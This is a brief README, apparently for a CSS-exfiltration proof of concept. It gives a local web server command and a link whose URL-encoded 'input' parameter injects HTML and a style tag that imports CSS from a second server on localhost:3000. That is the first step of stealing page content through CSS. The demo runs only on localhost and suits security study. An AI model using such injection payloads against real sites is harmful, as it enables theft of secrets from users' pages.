# CSS-Exfiltration

Run the code with:
```
python3 -m http.server
```
Open the link with exploit:
```
http://localhost:8000/?input=%3Ch1%3E%3C/h1%3E%3Cstyle%3E@import%20%27//localhost:3000/start%27;%3C/style%3E
```